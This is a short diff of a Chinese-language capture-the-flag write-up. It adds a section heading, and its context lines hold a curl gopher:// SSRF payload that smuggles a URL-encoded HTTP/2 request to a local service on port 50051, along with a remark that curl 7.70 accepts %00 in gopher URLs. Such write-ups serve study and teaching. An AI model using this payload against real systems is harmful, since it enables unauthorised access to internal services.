@@ -508,6 +508,7 @@ curl gopher://127.0.0.1:50051/_%50%52%49%20%2a%20%48%54%54%50%2f%32%2e%30%0d%0a%
 
 注意到题目的 curl 版本为 7.70，属于一个比较老的版本，在较老的版本中，curl 支持在 gopher:// URL 中发送 %00，这也是题目的一个提示点。
 
+## Aurors Archive
 
 ## 参考
 - [hackthebox/cyber-apocalypse-2025: Official writeups for Cyber Apocalypse CTF 2025: Tales from Eldoria](https://github.com/hackthebox/cyber-apocalypse-2025)
